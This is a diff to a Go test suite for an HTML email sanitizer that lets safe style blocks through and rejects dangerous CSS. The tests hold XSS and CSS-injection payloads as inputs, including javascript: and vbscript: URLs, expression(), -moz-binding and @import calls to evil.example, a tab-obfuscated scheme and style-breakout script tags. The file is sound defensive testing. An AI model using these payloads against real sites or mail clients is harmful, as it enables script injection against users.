@@ -143,8 +143,14 @@ func TestSanitize_StillStripsTheDangerousParts(t *testing.T) {
 		`<td style="background:url(javascript:alert(1))">hi</td></tr></table></body></html>`
 	out := Sanitize(in)
 
+	// "<style" is deliberately absent from this list now: a style block
+	// with safe CSS is allowed (see TestSanitizeKeepsStyleBlocks), because
+	// dropping it gutted every real email template. The CSS inside one is
+	// checked separately, and TestSanitizeRejectsDangerousCSS covers that
+	// — this input's style block is harmless and may survive. Everything
+	// else here must still be impossible.
 	for _, forbidden := range []string{
-		"<script", "<iframe", "<style", "onerror", "onmouseover", "javascript:", "DOCTYPE", "background=",
+		"<script", "<iframe", "onerror", "onmouseover", "javascript:", "DOCTYPE", "background=",
 	} {
 		if strings.Contains(strings.ToLower(out), strings.ToLower(forbidden)) {
 			t.Errorf("%q survived sanitization — this must never be reachable:\n%s", forbidden, out)
@@ -156,5 +162,94 @@ func TestSanitize_StillStripsTheDangerousParts(t *testing.T) {
 	}
 	if !strings.Contains(out, "hi") {
 		t.Errorf("text content was lost:\n%s", out)
+	}
+}
+
+// A real email template keeps its styling.
+//
+// Every design tool puts typography, colour and the whole responsive
+// layout in a <style> block. Dropping it silently — which is what used to
+// happen — left a leader looking at an unstyled email with nothing saying
+// why, and is the reason this was reported as "the HTML doesn't display
+// correctly".
+func TestSanitizeKeepsStyleBlocks(t *testing.T) {
+	in := `<style>.hdr { color:#003F87 } @media (max-width:600px){ .hdr{font-size:20px} }</style>
+<h1 class="hdr">Come and visit</h1>`
+	out := Sanitize(in)
+
+	for _, want := range []string{"<style>", ".hdr", "#003F87", "@media (max-width:600px)"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("sanitized output lost %q:\n%s", want, out)
+		}
+	}
+	// CSS is not markup: escaping it would corrupt child selectors and
+	// media queries.
+	if strings.Contains(out, "&gt;") || strings.Contains(out, "&amp;") {
+		t.Errorf("CSS was HTML-escaped, which corrupts it:\n%s", out)
+	}
+}
+
+func TestSanitizeKeepsChildSelectorsIntact(t *testing.T) {
+	out := Sanitize(`<style>table > tbody > tr { padding:0 }</style>`)
+	if !strings.Contains(out, "table > tbody > tr") {
+		t.Errorf("child selectors were mangled:\n%s", out)
+	}
+}
+
+// The block is refused whole rather than partly rewritten. Each of these
+// is a real execution or fetch vector, not a precaution.
+func TestSanitizeRejectsDangerousCSS(t *testing.T) {
+	for name, css := range map[string]string{
+		"IE expression":     `.a { width: expression(alert(1)) }`,
+		"javascript url":    `.a { background: url(javascript:alert(1)) }`,
+		"vbscript url":      `.a { background: url(vbscript:msgbox(1)) }`,
+		"moz-binding":       `.a { -moz-binding: url(http://evil.example/x.xml#e) }`,
+		"IE behavior":       `.a { behavior: url(evil.htc) }`,
+		"remote import":     `@import url("http://evil.example/x.css");`,
+		"obfuscated scheme": `.a { background: url(java` + "\t" + `script:alert(1)) }`,
+	} {
+		out := Sanitize("<style>" + css + "</style><p>body</p>")
+		if strings.Contains(out, "<style") {
+			t.Errorf("%s: dangerous CSS was emitted:\n%s", name, out)
+		}
+		// The rest of the message must survive — refusing the stylesheet
+		// is not a reason to lose the letter.
+		if !strings.Contains(out, "<p>body</p>") {
+			t.Errorf("%s: refusing the style block also dropped the body:\n%s", name, out)
+		}
+	}
+}
+
+// The breakout: CSS that closes its own block and opens something else.
+func TestSanitizeRejectsStyleBreakout(t *testing.T) {
+	out := Sanitize(`<style>.a{}</style><script>alert(1)</script>`)
+	if strings.Contains(strings.ToLower(out), "<script") {
+		t.Fatalf("a script tag survived:\n%s", out)
+	}
+
+	// And the same attempted from inside the CSS text.
+	out = Sanitize("<style>.a{} </style><script>alert(1)</script></style>")
+	if strings.Contains(strings.ToLower(out), "<script") {
+		t.Fatalf("a script tag survived a style breakout:\n%s", out)
+	}
+}
+
+// Everything genuinely dangerous stays out.
+func TestSanitizeStillDropsExecutableTags(t *testing.T) {
+	for _, in := range []string{
+		`<script>alert(1)</script>`,
+		`<iframe src="http://evil.example"></iframe>`,
+		`<object data="x"></object>`,
+		`<embed src="x">`,
+		`<form action="http://evil.example"><input name="p"></form>`,
+		`<link rel="stylesheet" href="http://evil.example/x.css">`,
+		`<img src=x onerror="alert(1)">`,
+	} {
+		out := Sanitize(in)
+		for _, bad := range []string{"<script", "<iframe", "<object", "<embed", "<form", "<link", "onerror"} {
+			if strings.Contains(strings.ToLower(out), bad) {
+				t.Errorf("input %q produced %q in:\n%s", in, bad, out)
+			}
+		}
 	}
 }
